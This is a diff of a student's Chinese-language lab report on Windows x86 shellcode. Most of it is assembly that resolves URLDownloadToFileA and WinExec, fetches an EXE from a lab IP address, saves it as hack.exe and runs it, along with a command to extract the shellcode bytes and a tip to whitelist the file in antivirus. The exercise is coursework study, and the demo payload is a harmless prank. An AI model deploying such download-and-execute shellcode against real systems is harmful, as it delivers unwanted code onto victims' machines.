@@ -3,7 +3,7 @@
 ## 实验要求
 
 - [x] 详细阅读 https://www.exploit-db.com/shellcodes 中的 shellcode。建议找不同功能、不同平台的 3-4 个 shellcode 解读
-- [ ] 修改示例代码的 shellcode，将其功能改为下载执行，也就是从网络中下载一个程序，然后运行下载的这个程序。提示：Windows 系统中最简单的下载一个文件的 API 是`UrlDownlaodToFileA`
+- [x] 修改示例代码的 shellcode，将其功能改为下载执行，也就是从网络中下载一个程序，然后运行下载的这个程序。提示：Windows 系统中最简单的下载一个文件的 API 是`URLDownloadToFileA`
 
 ## shellcode 解读
 
@@ -99,19 +99,19 @@
 
 ## 编写下载执行程序的 shellcode
 
-- `URLDownloadToFileA`函数位于`urlmon.dll`，直接加载这个 DLL 似乎不那么方便，但是可以通过`kernel32.dll`中的`LoadLibraryA`函数来加载，这样改写代码的难度就小了很多。先使用`findFunctionAddr`查找`LoadLibraryA`函数（参考：[Windows/x86 - MSVCRT System + Dynamic Null-free + Add RDP Admin + Disable Firewall + Enable RDP Shellcode](https://www.exploit-db.com/exploits/48355)）
+- `URLDownloadToFileA`函数位于`urlmon.dll`，直接加载这个 DLL 似乎不那么方便，但是可以通过`kernel32.dll`中的`LoadLibraryA`函数来加载，这样改写代码的难度就小了很多。（参考：[Windows/x86 - MSVCRT System + Dynamic Null-free + Add RDP Admin + Disable Firewall + Enable RDP Shellcode](https://www.exploit-db.com/exploits/48355)）
+- 要注意字符串存储的位置应与`findFunctionAddr`中查找字符串的位置一致
     ```
-    functions:
-    # Push string "GetProcAddress",0x00 onto the stack
+    ; Push string "GetProcAddress",0x00 onto the stack
     xor eax, eax            ; clear eax register
     mov ax, 0x7373          ; AX is the lower 16-bits of the 32bit EAX Register
     push eax                ;   ss : 73730000 // EAX = 0x00007373 // \x73=ASCII "s"
     push 0x65726464         ; erdd : 65726464 // "GetProcAddress"
     push 0x41636f72         ; Acor : 41636f72
     push 0x50746547         ; PteG : 50746547
-    mov [ebp-0x18], esp      ; save PTR to string at bottom of stack (ebp)
+    mov [ebp+0x18], esp      ; save PTR to string at bottom of stack (ebp)
     call findFunctionAddr   ; After Return EAX will = &GetProcAddress
-    # EAX = &GetProcAddress
+    ; EAX = &GetProcAddress
     mov [ebp-0x1C], eax      ; save &GetProcAddress
 
     ; Call GetProcAddress(&kernel32.dll, PTR "LoadLibraryA"0x00)
@@ -139,23 +139,97 @@
     call ebx                ; call the LoadLibraryA Function to load urlmon.dll
     mov [ebp-0x24], eax     ; save Address of urlmon.dll
     ```
-- 获得`UrlDownlaodToFileA`函数的地址
+- 获得`URLDownloadToFileA`函数的地址
     ```
-    ; Call GetProcAddress(urlmon.dll, "UrlDownlaodToFileA")
+    ; Call GetProcAddress(urlmon.dll, "URLDownloadToFileA")
     xor edx, edx
-    mov ax, 0x4165          ; Ae
-    push eax
+    mov dx, 0x4165          ; Ae
+    push edx
     push 0x6C69466F         ; liFo
-    push 0x54646F61         ; Tdoa
+    push 0x5464616F         ; Tdao
     push 0x6C6E776F         ; lnwo
-    push 0x446C7255         ; DlrU
-    push [ebp-0x18], esp                ; push pointer to string to stack for 'UrlDownlaodToFileA'
+    push 0x444c5255         ; DLRU
+    push esp    		        ; push pointer to string to stack for 'URLDownloadToFileA'
     push dword [ebp-0x24]   ; push base address of urlmon.dll to stack
     mov eax, [ebp-0x1C]     ; PTR to GetProcAddress to EAX
     call eax                ; GetProcAddress
     ;   EAX = WSAStartup Address
-    mov [ebp-0x28], eax     ; save Address of urlmon.UrlDownlaodToFileA
+    mov [ebp-0x28], eax     ; save Address of urlmon.URLDownloadToFileA
     ```
+- 调用`URLDownloadToFileA`下载`http://192.168.56.13/goosedt.exe`
+  ```
+  ;URLDownloadToFileA(NULL, URL, save as, 0, NULL)
+  download:
+  pop eax
+  xor ecx, ecx
+  push ecx
+  ; URL: http://192.168.56.13/goose.exe
+  push 0x6578652E         ; exe.
+  push 0x74646573         ; tdes
+  push 0x6F6F672F         ; oog/
+  push 0x33312E36         ; 31.6
+  push 0x352E3836         ; 5.86
+  push 0x312E3239         ; 1.29
+  push 0x312F2F3A         ; 1//:
+  push 0x70747468         ; ptth
+  push esp
+  pop ecx                 ; save the URL string
+  xor ebx, ebx
+  push ebx
+  ; save as hack.exe
+  push 0x6578652E         ; exe.
+  push 0x6B636168         ; kcah
+  push esp
+  pop ebx                 ; save the downloaded filename string
+  xor edx, edx
+  push edx
+  push edx
+  push ebx
+  push ecx
+  push edx
+  mov eax, [ebp-0x28]     ; PTR to URLDownloadToFileA to EAX
+  call eax
+  pop ecx
+  add esp, 44
+  xor edx, edx
+  cmp eax, edx
+  push ecx
+  jnz download            ; if it fails to download , retry contineusly
+  pop edx
+  ```
+- 查找`WinExec`函数，并调用该函数运行`hack.exe`
+  ```
+  ; Create string 'WinExec\x00' on the stack and save its address to the stack-frame
+  mov edx, 0x63657878     ; "cexx"
+  shr edx, 8              ; Shifts edx register to the right 8 bits
+  push edx                ; "\x00,cex"
+  push 0x456E6957         ; EniW : 456E6957
+  mov [ebp+0x18], esp     ; save address of string 'WinExec\x00' to the stack-frame
+  call findFunctionAddr   ; After Return EAX will = &WinExec
+
+  ; Call WinExec( CmdLine, ShowState );
+  ;   CmdLine   = "hack.exe"
+  ;   ShowState = 0x00000000 = SW_HIDE - Hides the window and activates another window.
+  xor ecx, ecx          ; clear eax register
+  push ecx              ; string terminator 0x00 for "hack.exe" string
+  push 0x6578652e       ; exe. : 6578652e
+  push 0x6B636168       ; kcah : 6B636168
+  mov ebx, esp          ; save pointer to "hack.exe" string in eax
+  inc ecx               ; uCmdShow SW_SHOWNORMAL = 0x00000001
+  push ecx              ; uCmdShow  - push 0x1 to stack # 2nd argument
+  push ebx              ; lpcmdLine - push string address stack # 1st argument
+  call eax              ; Call the WinExec Function
+  ```
+- 将汇编指令转化成 code
+  ```
+  nasm -f win32 win32-Download_Exec-Exit.asm -o win32-Download_Exec-Exit.o
+  for i in $(objdump -D win32-Download_Exec-Exit.o | grep "^ " | cut -f2); do echo -n '\x'$i; done; echo
+  ```
+- 为了演示效果本次实验使用的 EXE 文件执行后会释放一只鹅，将会在你的屏幕上捣乱(<ゝωΦ)【因为包含下载运行操作，使用 shellcode 的 EXE 文件前，要加入杀毒软件的信任列表】，实验效果如下：<br>
+
+  <img src="img/goose-hack.gif" alt="无名之鹅" width=700px>
+
+  - 因为没有下配置文件所以会报错，并生成一个配置文件【Σ( ° △ °|||)︴产生多余文件好像不是什么明智的选择】
 
 ## 参考资料
 
